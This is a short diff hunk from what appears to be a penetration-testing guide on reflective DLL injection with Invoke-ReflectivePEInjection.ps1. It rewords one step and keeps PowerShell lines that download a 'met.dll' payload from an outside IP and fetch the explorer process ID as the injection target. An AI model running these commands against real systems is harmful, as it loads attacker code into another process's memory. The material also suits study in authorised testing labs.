@@ -19,7 +19,8 @@ Import-Module .\Invoke-ReflectivePEInjection.ps1
 ```
 
 
-3. Next we will load the DLL into a byte array and retrieve the `explorer` process ID (**NOTE:** _change the process based on your target environment_):
+3. Next we will load the DLL into a byte array and retrieve the `explorer` process ID.
+  (**NOTE:** _change the process based on your target environment, you can also load an executables (.exe) bytes into memory as well_):
 ```powershell
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.191/met.dll')
 $procid = (Get-Process -Name explorer).Id
